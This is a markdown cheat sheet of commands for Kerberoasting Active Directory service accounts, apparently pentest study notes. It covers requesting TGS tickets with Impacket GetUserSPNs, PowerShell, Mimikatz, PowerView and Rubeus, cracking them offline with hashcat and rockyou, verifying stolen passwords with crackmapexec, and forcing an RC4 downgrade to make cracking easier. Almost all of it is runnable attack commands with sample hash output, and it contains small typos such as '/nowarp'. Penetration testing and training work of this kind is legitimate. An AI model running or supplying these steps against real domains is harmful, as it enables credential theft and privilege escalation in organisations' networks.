# Kerberoasting - from Linux

Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. 
This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. 
## 1/ Kerberoasting with GetUserSPNs.py
```bash
# First install Impacket toolkit
sudo python3 -m pip install .
```
## 2/ Listing SPN Accounts with GetUserSPNs.py
```bash
GetUserSPNs.py -dc-ip 192.168.0.1 MYDOMAIN.LOCAL/username
# we need valid domain credentials and the IP address of a Domain Controller.
``` 
## 3/ Requesting all TGS Tickets
```bash
GetUserSPNs.py -dc-ip 192.168.0.1 MYDOMAIN.LOCAL/username -request 
``` 
## 4/ Requesting a Single TGS ticket
```bash
GetUserSPNs.py -dc-ip 192.168.0.1 MYDOMAIN.LOCAL/username -request-user targetUser
``` 
## 5/ Saving the TGS Ticket to an Output File
```bash
GetUserSPNs.py -dc-ip 192.168.0.1 MYDOMAIN.LOCAL/username -request-user TargetUser -outputfile TargetUser_tgs
``` 
## 6/ Cracking the Ticket with Hashcat
```bash
hashcat -m 13100 TargetUser_tgs /usr/share/wordlists/rockyou.txt 
``` 
## 7/ Testing Authentication against a Domain Controller
```bash
sudo crackmapexec smb 192.168.0.1 -u TargetUser -p PWDTargetUser
```
____________________________________________________________________________________
# Kerberoasting - from Windows
## Kerberoasting - Semi Manual method
### 1/ Enumerating SPNs with setspn.exe
```powershell
setspn.exe -Q */*
```
Targeting a Single User
```powershell
Add-Type -AssemblyName System.IdentityModel
# The Add-Type cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
# The -AssemblyName parameter allows us to specify an assembly that contains types that we are interested in using
# System.IdentityModel is a namespace that contains different classes for building security token services
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "serviceName/mydomain.local:1433"
# We'll then use the New-Object cmdlet to create an instance of a .NET Framework object
# use the System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session
```
Once that the tickets are loaded, we can use Mimikatz to extract the ticket(s) from memory.
### 2/ Extracting Tickets from Memory with Mimikatz
```powershell
mimikatz # kerberos::list /export 
```
### 3/ Preparing the Base64 Blob for Cracking
```bash
echo "<base64 blob>" |  tr -d \\n 
``` 
We can place the above single line of output into a file and convert it back to a .kirbi file using the base64 utility.
### 4/ Placing the Output into a File as .kirbi
```bash
cat encoded_file | base64 -d > sqldev.kirbi
``` 
we can use this (https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) version of the kirbi2john.py tool to extract the Kerberos ticket from the TGS file
### 5/ Extracting the Kerberos Ticket using kirbi2john.py
```bash
python2.7 kirbi2john.py sqldev.kirbi
``` 
This will create a file called crack_file. We then must modify the file a bit to be able to use Hashcat against the hash.
### 6/ Modifiying crack_file for Hashcat
```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
# check it :
cat sqldev_tgs_hashcat
$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b4 .........
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
``` 
## Automated / Tool Based Route
### 1/ Use PowerView to Extract TGS Tickets
```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```
### 2/ Using PowerView to Target a Specific User
```powershell
Get-DomainUser -Identity username | Get-DomainSPNTicket -Format Hashcat
```
### 3/ Exporting All Tickets to a CSV File
```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
# check the content
cat .\ilfreight_tgs.csv
# you will have :
"SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHexStream","Hash"
"adfs","CN=adfs,OU=Service Accounts,OU=Corp,DC=MYDOMAIN,DC=LOCAL","adfsconnect/azure01.mydomain.local",,"$krb5tgs$23$*adfs$MYDOMAIN.LOCAL$adfsconnect/azure01.mydomain.local*$59C086008BBE7EAE4E483506632F6EF8$622D9E1DBCB1
``` 
### 4/ Use Rubeus
Use Rubeus to perform Kerberoasting even faster and easier. Rubeus provides us with a variety of options for performing Kerberoasting.
#### Using the /nowrap Flag
Use Rubeus to request tickets for accounts with the admincount attribute set to 1. 
These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. 
Be sure to specify the /nowrap flag so that the hash can be more easily copied down for offline cracking using Hashcat. 
```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
### 5/ Hashcat for Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96)
```bash
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
``` 
### 6/ downgrade from AES to RC4 (easier to crack)
```powershell
.\rubeus.exe kerberoast /tgtleg /user:username /nowarp
```








